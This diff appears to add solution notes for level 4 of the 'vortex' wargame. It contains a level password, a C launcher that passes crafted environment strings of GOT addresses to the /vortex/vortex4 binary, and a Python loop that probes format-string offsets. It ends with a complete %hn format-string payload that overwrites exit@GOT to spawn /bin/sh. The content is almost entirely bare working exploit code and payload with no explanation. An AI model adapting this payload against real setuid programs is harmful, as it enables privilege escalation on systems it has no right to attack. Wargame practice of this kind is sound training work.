@@ -28,3 +28,18 @@ io.interact()
 
 #vortex4
 #2YmgK1=jw
+
+#include <stdlib.h>
+int main(int argc, char **argv) {
+        char *envp[] = { "\x14\xa0\x04\x08\x16\xa0\x04\x08\x0c\xa0\x04\x08\x0e\xa0\x04\x08", "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH", argv[1] };
+        execve("/vortex/vortex4",0,envp);
+        return 0;
+}
+
+>>> import os
+>>> for i in xrange(200):
+...     os.system("./v4e '%"+str(i)+"$x'")
+...     print "#%d" % i
+
+exit 0x804a014 = 
+./v4e '/bin/sh && ls %2038d%99$hn%9420d%100$hn%22424d%98$hn%29566d%101$n'
